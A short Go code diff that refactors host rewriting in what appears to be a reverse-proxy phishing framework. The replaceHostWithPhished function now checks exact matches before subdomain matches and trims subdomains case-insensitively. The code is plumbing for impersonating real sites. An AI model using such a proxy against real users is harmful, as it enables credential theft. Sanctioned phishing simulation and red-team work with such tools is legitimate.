@@ -828,14 +828,21 @@ func (m *ProxyHandler) replaceHostWithOriginal(hostname string, config map[strin
 }
 
 func (m *ProxyHandler) replaceHostWithPhished(hostname string, config map[string]service.ProxyServiceDomainConfig) string {
+	// first pass: look for exact matches (case-insensitive)
 	for originalHost, hostConfig := range config {
 		if strings.EqualFold(originalHost, hostname) {
 			return hostConfig.To
 		}
+	}
 
-		// check for subdomain mapping
+	// second pass: look for subdomain matches
+	for originalHost, hostConfig := range config {
 		if strings.HasSuffix(strings.ToLower(hostname), "."+strings.ToLower(originalHost)) {
-			subdomain := strings.TrimSuffix(hostname, "."+originalHost)
+			// use case-insensitive trimming to handle mixed case properly
+			lowerHostname := strings.ToLower(hostname)
+			lowerOriginal := strings.ToLower(originalHost)
+			subdomain := strings.TrimSuffix(lowerHostname, "."+lowerOriginal)
+
 			if subdomain != "" {
 				return subdomain + "." + hostConfig.To
 			}
